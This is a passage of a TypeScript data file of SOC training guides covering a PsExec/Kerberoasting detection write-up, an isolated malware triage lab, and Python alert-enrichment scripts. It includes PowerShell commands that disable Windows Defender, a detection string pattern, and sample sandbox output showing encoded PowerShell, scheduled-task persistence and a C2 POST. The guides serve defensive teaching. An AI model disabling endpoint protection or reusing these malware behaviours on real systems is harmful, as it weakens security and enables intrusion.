          label: "Detect it — service creation is the giveaway",
          code: "index=main (EventCode=7045 OR EventCode=4697)\n| table _time, host, Service_Name, Service_File_Name, Account_Name\n| sort - _time",
        },
        {
          lang: "spl",
          label: "And the network logon that preceded it",
          code: "index=main EventCode=4624 Logon_Type=3\n| stats count, values(Account_Name) as accounts by Source_Network_Address, host\n| where count > 0\n| sort - count",
        },
      ],
      expect:
        "<p>PsExec works by installing a temporary service, which logs event <b>7045</b> with a randomly-named binary. That random service name is one of the most reliable lateral-movement signals there is — legitimate software installs services with recognisable names.</p>",
      expectCode:
        "_time                host        Service_Name  Service_File_Name\n2026-07-26 15:31:07  soc-victim  BTOBTO        %SystemRoot%\\BTOBTO.exe",
      fixes: [
        {
          problem: "psexec fails with STATUS_ACCESS_DENIED",
          cause: "The account is not a local administrator on the target.",
          fix: "You added <code>svc_sql</code> to Domain Admins in step 2, which grants this. Confirm with <code>net group \"Domain Admins\" /domain</code> on the DC.",
        },
        {
          problem: "No 7045 events",
          cause: "7045 is in the System log, not Security — and you may only be forwarding Security.",
          fix: "Add it: <code>.\\splunk.exe add monitor \"WinEventLog://System\" -index main</code> on the victim, then restart the forwarder.",
        },
      ],
    },
    {
      title: "Write up the attack chain",
      time: "30 min",
      why: "The chain is the story. Individual events are trivia; the sequence is what demonstrates you understand how an intrusion actually unfolds.",
      body: "<p>Document the whole path with timestamps, the event ID at each stage, and whether your detection caught it:</p><ol><li>Ordinary user <code>alice</code> requests a service ticket — <b>4769</b>, RC4 — <i>detected</i></li><li>Ticket cracked offline — <b>no events at all</b> — <i>undetectable by design</i></li><li>Cracked <code>svc_sql</code> used for remote execution — <b>4624 type 3</b>, then <b>7045</b> — <i>detected</i></li><li>SYSTEM shell on a second machine — <b>4688</b> process creation — <i>detected if command-line auditing is on</i></li></ol><p>Then write the defensive recommendations, because that is what a manager actually wants: use group Managed Service Accounts so passwords are 120 random characters and rotate automatically; force AES instead of RC4; alert on 4769 with RC4; and monitor 7045 for randomly-named services.</p>",
      expect:
        "<p>A one-page attack narrative with a detection verdict at every stage — including the honest &ldquo;undetectable&rdquo; one. Knowing where your visibility ends is as valuable as knowing where it works.</p>",
    },
  ],
  after: [
    "<b>Restore your snapshots.</b> This domain has a Domain Admin account with a five-character password in it — do not leave it running.",
    "If you keep the domain, at minimum change <code>svc_sql</code> to a long random password and remove it from Domain Admins.",
    "Read the SANS Kerberoasting material and Sean Metcalf's adsecurity.org — both are excellent and free.",
  ],
};

/* -------------------------------------------------------------------------- */
/* 07 — Malware triage lab                                                     */
/* -------------------------------------------------------------------------- */

export const g07: ProjectGuide = {
  slug: "malware-triage-lab",
  projectId: 7,
  intro:
    "<p>When an EDR alert fires on a suspicious file, someone has to answer three questions quickly: what is it, what did it do, and is anyone else affected? That is triage — not full reverse engineering, but enough analysis to make a containment decision.</p><p>You are going to build an isolated analysis environment and work through a real sample using static analysis first (safe — you never run it), then dynamic analysis in a sandbox, and finally you will extract indicators and hunt for them across your lab.</p><p><b>This is the one project in the kit where a mistake has real consequences.</b> The isolation steps are not optional and the guide is deliberately strict about them.</p>",
  glossary: [
    {
      term: "Static analysis",
      plain:
        "Examining a file without running it — strings, headers, imports, hashes. Completely safe, and often enough to reach a verdict.",
    },
    {
      term: "Dynamic analysis",
      plain:
        "Running the file in a controlled environment and watching what it does. More informative, considerably more dangerous.",
    },
    {
      term: "PE header",
      plain:
        "The structure at the start of every Windows executable. It records when it was compiled, which libraries it needs, and how it is laid out.",
    },
    {
      term: "Packing",
      plain:
        "Compressing or encrypting a program so its contents are hidden until it runs. Common in malware, but also in legitimate commercial software.",
    },
    {
      term: "Detonation",
      plain: "Deliberately running malware in a sandbox to observe its behaviour.",
    },
    {
      term: "IOC",
      plain:
        "Indicator of Compromise — a hash, domain, IP, filename, or registry key you can search your environment for.",
    },
  ],
  before: [
    "<b>A dedicated analysis VM.</b> Not the victim VM from project 01, and not a machine you care about.",
    "<b>A snapshot of that VM taken before any sample touches it.</b> This is how you reset between samples.",
    "Its network adapter set to <b>Not attached</b>, or host-only with no route out.",
    "About 5 hours.",
  ],
  steps: [
    {
      title: "Build the isolation, and verify it",
      time: "40 min",
      warn: "Do not download a single sample until every check in this step passes. Malware that escapes a lab does real damage to real people.",
      why: "Assuming isolation is how labs leak. Testing it takes five minutes.",
      body: "<p>Create a new VM named <code>malware-lab</code> — Windows 10, 4 GB RAM, 60 GB disk. Install Windows, then <b>before installing anything else</b>:</p><ol><li>VirtualBox Settings → <b>Network</b> → Adapter 1 → <b>Not attached</b></li><li>VirtualBox Settings → <b>Shared Folders</b> → remove all</li><li>VirtualBox Settings → <b>General → Advanced</b> → Shared Clipboard <b>Disabled</b>, Drag'n'Drop <b>Disabled</b></li><li>Turn off Windows Defender — it will delete your samples before you can analyse them</li></ol>",
      commands: [
        {
          lang: "powershell",
          where: "On malware-lab, as Administrator",
          label: "Disable Defender (in this VM only)",
          code: "Set-MpPreference -DisableRealtimeMonitoring $true\nSet-MpPreference -DisableIOAVProtection $true\nSet-MpPreference -DisableBehaviorMonitoring $true\n\n# Confirm it is off\nGet-MpPreference | Select-Object DisableRealtimeMonitoring",
        },
        {
          lang: "powershell",
          where: "On malware-lab",
          label: "PROVE isolation — all three must fail",
          code: "Test-NetConnection 8.8.8.8 -InformationLevel Quiet\nTest-NetConnection google.com -Port 443 -InformationLevel Quiet\nping 192.168.56.1",
        },
      ],
      expect:
        "<p>All three return <b>False</b> or time out. If any succeeds, the VM has a route out and you must not proceed. Only when all three fail, take a snapshot named <code>clean</code>.</p>",
      expectCode: "False\nFalse\nPing request could not find host. Please check the name and try again.",
      fixes: [
        {
          problem: "Network tests still succeed",
          cause: "A second adapter is enabled, or the setting was changed while the VM was running.",
          fix: "Power the VM fully off (not save-state), re-check every adapter in Settings → Network, then boot and re-test.",
        },
        {
          problem: "Defender re-enables itself after reboot",
          cause: "Tamper Protection overrides the PowerShell settings.",
          fix: "Turn off <b>Tamper Protection</b> first in Windows Security → Virus &amp; threat protection → Manage settings, then re-run the commands.",
        },
      ],
    },
    {
      title: "Install the analysis tools",
      time: "30 min",
      why: "Download these on your host and transfer them in before you disable networking — or use a one-time attached adapter, then detach it again and re-verify isolation.",
      body: "<p>You need a small toolkit. All of it is free.</p><ul><li><b>PEStudio</b> — reads PE headers and flags suspicious imports. The single most useful triage tool.</li><li><b>Strings</b> (Sysinternals) — extracts readable text from a binary.</li><li><b>Process Monitor</b> and <b>Process Explorer</b> (Sysinternals) — watch what a running process does.</li><li><b>Wireshark</b> — capture network attempts, even when they fail.</li><li><b>CyberChef</b> (download the standalone HTML) — decode obfuscated strings offline.</li></ul><p>Transfer them in, then <b>re-run the isolation checks from step 1</b> and take a fresh snapshot named <code>tools-installed</code>.</p>",
      expect:
        "<p>All tools present, network still unreachable, snapshot taken. That snapshot is what you revert to after every single sample.</p>",
    },
    {
      title: "Get a sample safely",
      time: "20 min",
      warn: "Download samples on the analysis VM only, or transfer them in a password-protected archive. The convention is the password <code>infected</code> — it stops your host antivirus from eating the file in transit.",
      body: "<p>Use a reputable source. <a href=\"https://bazaar.abuse.ch/\" target=\"_blank\" rel=\"noopener noreferrer\">MalwareBazaar</a> is free, well-curated, and requires no account for browsing.</p><p>Pick something common and well-documented for your first sample — an AgentTesla or Formbook sample is ideal, because published analyses exist and you can check your work.</p><p>Handle it correctly from the first moment:</p>",
      commands: [
        {
          lang: "powershell",
          where: "On malware-lab",
          label: "Neutralise the extension, then hash it",
          code: "# Rename so a stray double-click cannot execute it\nRename-Item sample.exe sample.exe.malz\n\n# Hash it — this is the first thing you record about any sample\nGet-FileHash sample.exe.malz -Algorithm SHA256\nGet-FileHash sample.exe.malz -Algorithm MD5",
        },
      ],
      expect:
        "<p>Two hashes written down. The SHA256 is the sample's identity — everything else you learn attaches to it.</p>",
      expectCode:
        "Algorithm  Hash\n---------  ----\nSHA256     4f2c8b1a9d3e7f0c5a6b8d2e4f1a3c7b9e0d5f8a2c4b6d8e0f1a3c5b7d9e1f3a",
    },
    {
      title: "Static analysis — learn everything without running it",
      time: "60 min",
      why: "Most triage questions can be answered without ever executing the file. Static analysis is free of risk, so it always comes first.",
      body: "<p>Work through the sample in layers, from cheapest to most involved.</p><p><b>Hash lookup first.</b> Paste the SHA256 into VirusTotal on your <i>host</i> machine (never upload the file — the hash is enough, and uploading may leak a customer's data in a real job). If it is known, you may be done in thirty seconds.</p>",
      commands: [
        {
          lang: "powershell",
          where: "On malware-lab",
          label: "Strings — the fastest look inside",
          code: "# ASCII and Unicode both — malware often stores strings as Unicode\n.\\strings.exe -n 8 sample.exe.malz > strings_ascii.txt\n.\\strings.exe -n 8 -u sample.exe.malz > strings_unicode.txt\n\n# What jumps out?\nSelect-String -Path strings_*.txt -Pattern 'http|https|\\.exe|\\.dll|CreateRemoteThread|VirtualAlloc|reg add|powershell' |\n  Select-Object -First 40",
        },
        {
          lang: "powershell",
          label: "Compile timestamp and section entropy",
          code: "# Open in PEStudio and check:\n#  - compile timestamp (a date in the future or 1970 = tampered)\n#  - imports (VirtualAlloc + WriteProcessMemory + CreateRemoteThread\n#             together = process injection)\n#  - section entropy (> 7.0 means packed or encrypted)\n#  - embedded resources (a second executable hidden inside)",
        },
      ],
      expect:
        "<p>Strings usually reveal something immediately — a C2 domain, a mutex name, a registry key. If nearly all strings are gibberish and entropy is above 7, the sample is packed and you will need dynamic analysis to see anything.</p>",
      expectCode:
        "http://185.220.101.44/gate.php\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nMozilla/5.0 (Windows NT 10.0; Win64; x64)\nCreateRemoteThread\nVirtualAllocEx",
      fixes: [
        {
          problem: "Strings output is entirely meaningless",
          cause: "The sample is packed — its real contents only exist in memory at runtime.",
          fix: "Expected for a large share of modern malware. Note it as a finding (packing is itself suspicious) and move to dynamic analysis.",
        },
      ],
    },
    {
      title: "Dynamic analysis — let someone else run it",
      time: "45 min",
      why: "You get most of the value of detonation with none of the risk by using an online sandbox. Only run it yourself when you have a specific question the sandbox did not answer.",
      body: "<p>Submit the hash — or the file, if the sample is public and contains no sensitive data — to a sandbox from your <b>host</b> machine:</p><ul><li><a href=\"https://any.run\" target=\"_blank\" rel=\"noopener noreferrer\">Any.Run</a> — interactive, and you can watch it happen live</li><li><a href=\"https://tria.ge\" target=\"_blank\" rel=\"noopener noreferrer\">Hatching Triage</a> — fast, free, excellent config extraction</li><li><a href=\"https://www.joesandbox.com\" target=\"_blank\" rel=\"noopener noreferrer\">Joe Sandbox</a> — the most detailed reports</li></ul><p>Read the report for four things specifically: the process tree, files created, registry changes, and network destinations.</p>",
      warn: "Never submit a file from a real incident to a public sandbox without authorisation. Submissions are frequently public, and you can leak your employer's data — this has ended careers.",
      expect:
        "<p>A process tree showing what spawned what, a list of dropped files, registry persistence keys, and the C2 addresses it tried to reach. Compare those C2 addresses against the strings you found — matching evidence from two independent methods is how you build confidence.</p>",
      expectCode:
        "sample.exe (PID 3312)\n └─ powershell.exe -w hidden -enc SQBFAFgA...\n     └─ cmd.exe /c schtasks /create /tn Updater /tr ...\n\nNetwork:  185.220.101.44:80  (HTTP POST /gate.php)\nRegistry: HKCU\\...\\Run\\SecurityUpdate = %APPDATA%\\svchost.exe",
    },
    {
      title: "If you must detonate locally, do it properly",
      time: "45 min",
      warn: "Only in the isolated VM, only after verifying isolation again, and only with a snapshot to revert to.",
      why: "Sometimes you need to see behaviour a sandbox missed — evasion, or a payload that only fires under specific conditions.",
      body: "<p>Set up monitoring <b>before</b> you run anything.</p>",
      commands: [
        {
          lang: "powershell",
          where: "On malware-lab",
          label: "Start recording first",
          code: "# 1. Wireshark: start a capture on the (disconnected) adapter.\n#    Even with no route out, you still see DNS and connection attempts.\n\n# 2. Process Monitor: start capture, then filter to reduce noise:\n#    Filter → Process Name → is → sample.exe → Include\n\n# 3. Snapshot the filesystem and registry state for comparison\nGet-ChildItem -Path C:\\Users\\$env:USERNAME\\AppData -Recurse -File |\n  Select-Object FullName, Length, LastWriteTime |\n  Export-Csv before.csv -NoTypeInformation",
        },
        {
          lang: "powershell",
          label: "Run it, wait, then stop everything",
          code: "Rename-Item sample.exe.malz sample.exe\n.\\sample.exe\n\n# Let it run 60 seconds, then stop Procmon and Wireshark.\n\nGet-ChildItem -Path C:\\Users\\$env:USERNAME\\AppData -Recurse -File |\n  Select-Object FullName, Length, LastWriteTime |\n  Export-Csv after.csv -NoTypeInformation\n\n# What changed?\nCompare-Object (Import-Csv before.csv) (Import-Csv after.csv) -Property FullName |\n  Where-Object SideIndicator -eq '=>'",
        },
      ],
      expect:
        "<p>The Compare-Object output lists exactly what the sample dropped. Procmon shows registry writes. Wireshark shows the DNS queries and connection attempts that failed — failed attempts are still perfectly good indicators.</p>",
      fixes: [
        {
          problem: "The sample exits immediately and does nothing",
          cause:
            "Anti-analysis. A lot of malware checks for VM artefacts, low disk size, few CPU cores, or an idle desktop, and quits if it thinks it is being watched.",
          fix: "Note it as a finding — sandbox evasion is a real behaviour worth reporting. Then rely on the online sandbox report, or research the family's known evasion checks.",
        },
        {
          problem: "Procmon captures hundreds of thousands of events",
          cause: "No filter applied.",
          fix: "Filter to the process name before running, and use Tools → Process Tree afterwards to see the spawn chain rather than scrolling raw events.",
        },
      ],
    },
    {
      title: "Extract IOCs and hunt for them",
      time: "40 min",
      why: "Analysis that stops at &ldquo;this is malicious&rdquo; has not helped anyone. The question your manager will ask is: <b>is anyone else affected?</b>",
      body: "<p>Collect everything searchable into one list, then hunt your lab for it.</p>",
      commands: [
        {
          lang: "spl",
          label: "Hunt the hash across the estate",
          code: "index=main (EventCode=4688 OR EventCode=1)\n| search Hashes=\"*4f2c8b1a9d3e7f0c*\" OR New_Process_Name=\"*svchost.exe\"\n| table _time, host, New_Process_Name, Parent_Process_Name, Account_Name",
        },
        {
          lang: "spl",
          label: "Hunt the persistence mechanism",
          code: "index=main (EventCode=4657 OR EventCode=13)\n| search Object_Name=\"*\\\\CurrentVersion\\\\Run*\"\n| table _time, host, Object_Name, New_Value, Account_Name",
        },
        {
          lang: "spl",
          label: "Hunt the C2 address in proxy or firewall logs",
          code: "index=main (\"185.220.101.44\" OR \"gate.php\")\n| stats count, values(user) as users by src_ip\n| sort - count",
        },
      ],
      expect:
        "<p>In your lab this returns nothing, which is the correct answer — the sample never ran outside the isolated VM. The value is the queries themselves: you now have a hunt pack you could run on day one of a real job.</p>",
    },
    {
      title: "Write the triage report",
      time: "40 min",
      why: "The report is the deliverable. Everything before this was gathering evidence for it.",
      body: "<p>Write it in the order a reader needs it, not the order you did it:</p><ol><li><b>Verdict and confidence</b> — first line, one sentence. &ldquo;Confirmed AgentTesla infostealer, high confidence.&rdquo;</li><li><b>Sample identity</b> — SHA256, MD5, file size, original filename, first seen</li><li><b>Capability</b> — what it does: steals browser credentials, persists via Run key, exfiltrates over HTTP</li><li><b>IOCs</b> — a clean table of hashes, domains, IPs, files, and registry keys</li><li><b>Detection opportunities</b> — which of these would your rules catch, and which would they miss</li><li><b>Recommended actions</b> — block the C2, hunt the hash, reset credentials on affected hosts</li></ol><p>Keep it to one page. A triage report that needs ten minutes to read defeats its own purpose.</p>",
      expect:
        "<p>A report an incident manager could act on without asking you a single follow-up question. That is the test.</p>",
    },
    {
      title: "Reset the lab",
      time: "10 min",
      warn: "Revert the snapshot. Do not reuse an infected VM for the next sample — you will attribute one sample's behaviour to another and reach a wrong conclusion.",
      body: "<p>VirtualBox → select <code>malware-lab</code> → Snapshots → select <code>tools-installed</code> → <b>Restore</b>.</p><p>Move your notes, hashes, and IOC list <b>out</b> of the VM first — via a text file you copy manually, never a shared folder.</p>",
      expect:
        "<p>A clean VM, still isolated, ready for the next sample. Re-run the isolation checks from step 1 after every restore; it takes thirty seconds and it is the discipline that keeps this safe.</p>",
    },
  ],
  after: [
    "Analyse three or four samples from different families. Patterns emerge quickly and that is where the real learning is.",
    "Compare your findings against a published analysis of the same family — it is the only way to calibrate whether you are reading the evidence correctly.",
    "Never store samples on your host machine. If you must keep them, use a password-protected archive on separate media.",
    "Learn a little assembly next. You do not need to be a reverse engineer, but recognising a decryption loop changes what you can do.",
  ],
};

/* -------------------------------------------------------------------------- */
/* 08 — Automated alert enrichment                                             */
/* -------------------------------------------------------------------------- */

export const g08: ProjectGuide = {
  slug: "alert-enrichment-automation",
  projectId: 8,
  intro:
    "<p>An L1 analyst spends an enormous share of their day on mechanical lookups: copy the IP, paste into VirusTotal, copy the hash, paste into another tab, check whether the user is in a sensitive group. It is slow, it is boring, and being tired makes you skip steps.</p><p>You are going to automate it. The script you build takes an alert, enriches every indicator in it automatically, and produces a summary an analyst can act on in seconds instead of minutes.</p><p>This is also the most portable project in the kit. Every SOC wants people who can automate their own job, and a working enrichment tool is something you can demonstrate in an interview in two minutes.</p>",
  glossary: [
    {
      term: "Enrichment",
      plain:
        "Adding context to raw data. The alert says <code>185.220.101.44</code>; enrichment tells you it is a Tor exit node in Germany flagged by 12 vendors.",
    },
    {
      term: "API",
      plain:
        "A way for programs to ask other programs for data. Instead of visiting VirusTotal in a browser, your script asks its API and gets JSON back.",
    },
    {
      term: "API key",
      plain:
        "A secret string identifying you to an API. Treat it exactly like a password — never put one in code you publish.",
    },
    {
      term: "Rate limit",
      plain:
        "A cap on how many requests you may make. VirusTotal's free tier allows 4 per minute; exceed it and you get errors instead of data.",
    },
    {
      term: "JSON",
      plain:
        "The format APIs answer in — nested keys and values. Python turns it into a dictionary you can index into.",
    },
  ],
  before: [
    "Python 3.8+ (<code>python3 --version</code>).",
    "A free <a href=\"https://www.virustotal.com/gui/join-us\" target=\"_blank\" rel=\"noopener noreferrer\">VirusTotal</a> account for an API key.",
    "A free <a href=\"https://www.abuseipdb.com/register\" target=\"_blank\" rel=\"noopener noreferrer\">AbuseIPDB</a> account for a second opinion on IPs.",
    "About 4 hours. Basic programming familiarity helps but the guide assumes none.",
  ],
  steps: [
    {
      title: "Set up the project and get your API keys",
      time: "25 min",
      body: "<p>Register for both services and copy your API keys. On VirusTotal the key is under your profile menu → <b>API key</b>. On AbuseIPDB it is under <b>Account → API</b>.</p>",
      commands: [
        {
          lang: "bash",
          label: "Project skeleton",
          code: "mkdir -p ~/alert-enrichment && cd ~/alert-enrichment\npython3 -m venv venv\nsource venv/bin/activate       # Windows: venv\\Scripts\\activate\n\npip install requests python-dotenv",
        },
        {
          lang: "bash",
          label: "Store the keys OUTSIDE the code",
          code: "cat > .env <<'EOF'\nVT_API_KEY=paste_your_virustotal_key_here\nABUSEIPDB_API_KEY=paste_your_abuseipdb_key_here\nEOF\n\n# Make sure this never reaches git\ncat > .gitignore <<'EOF'\n.env\nvenv/\n__pycache__/\n*.pyc\nEOF",
        },
      ],
      warn: "The .gitignore is not optional. Bots scan public GitHub commits for API keys within seconds — this is the single most common way beginners leak credentials.",
      expect:
        "<p>A folder with <code>.env</code> and <code>.gitignore</code>, and an active virtual environment (your prompt starts with <code>(venv)</code>).</p>",
    },
    {
      title: "Write the indicator extractor",
      time: "35 min",
      why: "Alerts arrive as messy text. Before you can enrich anything you have to find the indicators reliably — and avoid enriching your own internal addresses, which wastes rate limit and leaks information.",
      body: "<p>Start with the part that needs no API access at all, so you can test it immediately.</p>",
      commands: [
        {
          lang: "python",
          label: "extract.py",
          code: "import re\nimport ipaddress\n\nIP_RE   = re.compile(r'\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b')\nHASH_RE = re.compile(r'\\b[a-fA-F0-9]{32}\\b|\\b[a-fA-F0-9]{40}\\b|\\b[a-fA-F0-9]{64}\\b')\nDOM_RE  = re.compile(r'\\b(?:[a-zA-Z0-9-]+\\.)+[a-zA-Z]{2,}\\b')\n\n\ndef is_public(ip: str) -> bool:\n    \"\"\"Skip private, loopback and link-local — enriching them is pointless\n    and quietly tells a third party about your internal addressing.\"\"\"\n    try:\n        a = ipaddress.ip_address(ip)\n        return not (a.is_private or a.is_loopback or a.is_link_local\n                    or a.is_multicast or a.is_reserved)\n    except ValueError:\n        return False\n\n\ndef extract(text: str) -> dict:\n    ips = {ip for ip in IP_RE.findall(text) if is_public(ip)}\n    hashes = set(HASH_RE.findall(text))\n    # Domains regex also matches things like 'file.exe' — filter obvious files\n    domains = {\n        d for d in DOM_RE.findall(text)\n        if not d.lower().endswith(('.exe', '.dll', '.log', '.txt', '.local'))\n        and not IP_RE.fullmatch(d)\n    }\n    return {'ips': sorted(ips), 'hashes': sorted(hashes), 'domains': sorted(domains)}\n\n\nif __name__ == '__main__':\n    sample = '''\n    Alert: Suspicious outbound connection\n    Host 10.0.0.51 connected to 185.220.101.44 (evil-c2.example.com)\n    Process hash: 4f2c8b1a9d3e7f0c5a6b8d2e4f1a3c7b9e0d5f8a2c4b6d8e0f1a3c5b7d9e1f3a\n    '''\n    from pprint import pprint\n    pprint(extract(sample))",
        },
        {
          lang: "bash",
          label: "Test it",
          code: "python3 extract.py",
        },
      ],
      expect:
        "<p>The internal <code>10.0.0.51</code> is correctly excluded; the public IP, the domain, and the SHA256 are found.</p>",
      expectCode:
        "{'domains': ['evil-c2.example.com'],\n 'hashes': ['4f2c8b1a9d3e7f0c5a6b8d2e4f1a3c7b9e0d5f8a2c4b6d8e0f1a3c5b7d9e1f3a'],\n 'ips': ['185.220.101.44']}",
      fixes: [
        {
          problem: "The domain regex matches things that are not domains",
          cause: "Alert text contains filenames and version numbers that look domain-shaped.",
          fix: "Extend the exclusion tuple. Perfect extraction is not achievable — aim for few false positives on the things you actually see.",
        },
      ],
    },
    {
      title: "Add VirusTotal lookups",
      time: "45 min",
      why: "This is the lookup that takes an analyst the longest to do by hand, and the one most worth automating.",
      body: "<p>Handle rate limiting from the start rather than bolting it on later — the free tier is 4 requests per minute and hitting the cap mid-run produces confusing failures.</p>",
      commands: [
        {
          lang: "python",
          label: "enrich_vt.py",
          code: "import os\nimport time\nimport requests\nfrom dotenv import load_dotenv\n\nload_dotenv()\nVT_KEY = os.getenv('VT_API_KEY')\nBASE = 'https://www.virustotal.com/api/v3'\n\n# Free tier: 4 requests/minute. 16s between calls keeps us safely under.\nRATE_DELAY = 16\n_last_call = 0.0\n\n\ndef _throttle():\n    global _last_call\n    wait = RATE_DELAY - (time.time() - _last_call)\n    if wait > 0:\n        time.sleep(wait)\n    _last_call = time.time()\n\n\ndef vt_lookup(kind: str, value: str) -> dict:\n    \"\"\"kind: 'ip_addresses' | 'domains' | 'files'\"\"\"\n    if not VT_KEY:\n        return {'error': 'no API key configured'}\n\n    _throttle()\n    try:\n        r = requests.get(f'{BASE}/{kind}/{value}',\n                         headers={'x-apikey': VT_KEY}, timeout=15)\n    except requests.RequestException as e:\n        return {'error': f'request failed: {e}'}\n\n    if r.status_code == 404:\n        return {'found': False, 'note': 'not seen by VirusTotal'}\n    if r.status_code == 429:\n        return {'error': 'rate limited — slow down'}\n    if r.status_code != 200:\n        return {'error': f'HTTP {r.status_code}'}\n\n    attrs = r.json().get('data', {}).get('attributes', {})\n    stats = attrs.get('last_analysis_stats', {})\n    return {\n        'found': True,\n        'malicious': stats.get('malicious', 0),\n        'suspicious': stats.get('suspicious', 0),\n        'harmless': stats.get('harmless', 0),\n        'reputation': attrs.get('reputation'),\n        'country': attrs.get('country'),\n        'as_owner': attrs.get('as_owner'),\n        'label': (attrs.get('popular_threat_classification', {})\n                       .get('suggested_threat_label')),\n    }\n\n\nif __name__ == '__main__':\n    from pprint import pprint\n    pprint(vt_lookup('ip_addresses', '8.8.8.8'))",
        },
      ],
      expect:
        "<p>A dictionary for Google's DNS showing zero malicious detections. Test with something known-good first — if you start with a suspicious indicator you cannot tell a working script from a broken one.</p>",
      expectCode:
        "{'as_owner': 'GOOGLE',\n 'country': 'US',\n 'found': True,\n 'harmless': 67,\n 'malicious': 0,\n 'reputation': 480,\n 'suspicious': 0}",
      fixes: [
        {
          problem: "HTTP 401",
          cause: "The API key is wrong, or <code>.env</code> was not loaded.",
          fix: "Check with <code>python3 -c \"import os; from dotenv import load_dotenv; load_dotenv(); print(repr(os.getenv('VT_API_KEY')))\"</code>. Watch for quotes or trailing spaces in the .env file — there should be neither.",
        },
        {
          problem: "HTTP 429 despite the throttle",
          cause: "The quota is daily as well as per-minute — 500/day on the free tier.",
          fix: "Cache results so repeated indicators are not looked up twice. The next step adds that.",
        },
      ],
    },
    {
      title: "Add caching and a second source",
      time: "40 min",
      why: "Caching turns a script that burns your quota into one you can run repeatedly. A second source matters because VirusTotal alone is a single point of view.",
      body: "<p>Cache to a local file, and add AbuseIPDB for a different signal — VirusTotal reports vendor detections, AbuseIPDB reports human abuse complaints.</p>",
      commands: [
        {
          lang: "python",
          label: "cache.py",
          code: "import json\nimport os\nimport time\n\nCACHE_FILE = 'enrichment_cache.json'\nTTL = 24 * 3600     # a day is fine for reputation data\n\n\ndef _load() -> dict:\n    if os.path.exists(CACHE_FILE):\n        try:\n            with open(CACHE_FILE) as f:\n                return json.load(f)\n        except json.JSONDecodeError:\n            return {}      # corrupt cache should not break the tool\n    return {}\n\n\ndef get(key: str):\n    entry = _load().get(key)\n    if entry and time.time() - entry['ts'] < TTL:\n        return entry['data']\n    return None\n\n\ndef put(key: str, data) -> None:\n    c = _load()\n    c[key] = {'ts': time.time(), 'data': data}\n    with open(CACHE_FILE, 'w') as f:\n        json.dump(c, f, indent=2)",
        },
        {
          lang: "python",
          label: "enrich_abuse.py",
          code: "import os\nimport requests\nfrom dotenv import load_dotenv\n\nload_dotenv()\nKEY = os.getenv('ABUSEIPDB_API_KEY')\n\n\ndef abuseipdb(ip: str) -> dict:\n    if not KEY:\n        return {'error': 'no API key configured'}\n    try:\n        r = requests.get(\n            'https://api.abuseipdb.com/api/v2/check',\n            headers={'Key': KEY, 'Accept': 'application/json'},\n            params={'ipAddress': ip, 'maxAgeInDays': 90},\n            timeout=15)\n    except requests.RequestException as e:\n        return {'error': str(e)}\n\n    if r.status_code != 200:\n        return {'error': f'HTTP {r.status_code}'}\n\n    d = r.json().get('data', {})\n    return {\n        'abuse_score': d.get('abuseConfidenceScore'),\n        'reports': d.get('totalReports'),\n        'country': d.get('countryCode'),\n        'isp': d.get('isp'),\n        'is_tor': d.get('isTor'),\n    }",
        },
      ],
      expect:
        "<p>Run the same lookup twice — the second is instant because it comes from cache. Delete <code>enrichment_cache.json</code> to force a refresh.</p>",
    },
    {
      title: "Tie it together into one tool",
      time: "45 min",
      body: "<p>One script that takes an alert file, extracts, enriches, and prints something an analyst can read at a glance.</p>",
      commands: [
        {
          lang: "python",
          label: "enrich.py",
          code: "#!/usr/bin/env python3\n\"\"\"Enrich every indicator in an alert. Usage: ./enrich.py alert.txt\"\"\"\nimport sys\n\nimport cache\nfrom extract import extract\nfrom enrich_vt import vt_lookup\nfrom enrich_abuse import abuseipdb\n\n\ndef cached(key, fn, *args):\n    hit = cache.get(key)\n    if hit is not None:\n        return hit\n    result = fn(*args)\n    cache.put(key, result)\n    return result\n\n\ndef verdict(vt, abuse):\n    \"\"\"Collapse two sources into one line an analyst can act on.\"\"\"\n    mal = (vt or {}).get('malicious', 0) or 0\n    score = (abuse or {}).get('abuse_score', 0) or 0\n    if mal >= 5 or score >= 75:\n        return 'MALICIOUS — block and hunt'\n    if mal >= 1 or score >= 25:\n        return 'SUSPICIOUS — needs an analyst'\n    return 'clean'\n\n\ndef main(path):\n    with open(path) as f:\n        text = f.read()\n\n    ioc = extract(text)\n    total = sum(len(v) for v in ioc.values())\n    print(f'\\n{\"=\" * 62}\\nENRICHMENT REPORT — {total} indicators\\n{\"=\" * 62}')\n\n    for ip in ioc['ips']:\n        vt = cached(f'vt:ip:{ip}', vt_lookup, 'ip_addresses', ip)\n        ab = cached(f'ab:{ip}', abuseipdb, ip)\n        print(f'\\nIP  {ip}')\n        print(f'    VirusTotal : {vt.get(\"malicious\", \"?\")} malicious'\n              f'  ({vt.get(\"as_owner\") or \"unknown ASN\"}, {vt.get(\"country\") or \"??\"})')\n        print(f'    AbuseIPDB  : score {ab.get(\"abuse_score\", \"?\")}'\n              f'  from {ab.get(\"reports\", \"?\")} reports'\n              + ('  [TOR EXIT NODE]' if ab.get('is_tor') else ''))\n        print(f'    >>> {verdict(vt, ab)}')\n\n    for d in ioc['domains']:\n        vt = cached(f'vt:dom:{d}', vt_lookup, 'domains', d)\n        print(f'\\nDOMAIN  {d}')\n        print(f'    VirusTotal : {vt.get(\"malicious\", \"?\")} malicious')\n        print(f'    >>> {verdict(vt, None)}')\n\n    for h in ioc['hashes']:\n        vt = cached(f'vt:file:{h}', vt_lookup, 'files', h)\n        print(f'\\nHASH  {h[:24]}...')\n        if vt.get('found'):\n            print(f'    VirusTotal : {vt.get(\"malicious\")} malicious'\n                  f'  — {vt.get(\"label\") or \"no family label\"}')\n        else:\n            print('    VirusTotal : not seen  (new sample, or never submitted)')\n        print(f'    >>> {verdict(vt, None)}')\n\n    print(f'\\n{\"=\" * 62}\\n')\n\n\nif __name__ == '__main__':\n    if len(sys.argv) != 2:\n        sys.exit('usage: enrich.py <alert-file>')\n    main(sys.argv[1])",
        },
        {
          lang: "bash",
          label: "Run it",
          code: "cat > alert.txt <<'EOF'\nAlert ID 8823 — Suspicious outbound connection\nHost 10.0.0.51 (labuser) connected to 185.220.101.44\nResolved from evil-c2.example.com\nProcess hash 4f2c8b1a9d3e7f0c5a6b8d2e4f1a3c7b9e0d5f8a2c4b6d8e0f1a3c5b7d9e1f3a\nEOF\n\nchmod +x enrich.py\n./enrich.py alert.txt",
        },
      ],
      expect:
        "<p>A readable report with a verdict per indicator. Time yourself doing the same lookups by hand — the comparison is the number you quote in an interview.</p>",
      expectCode:
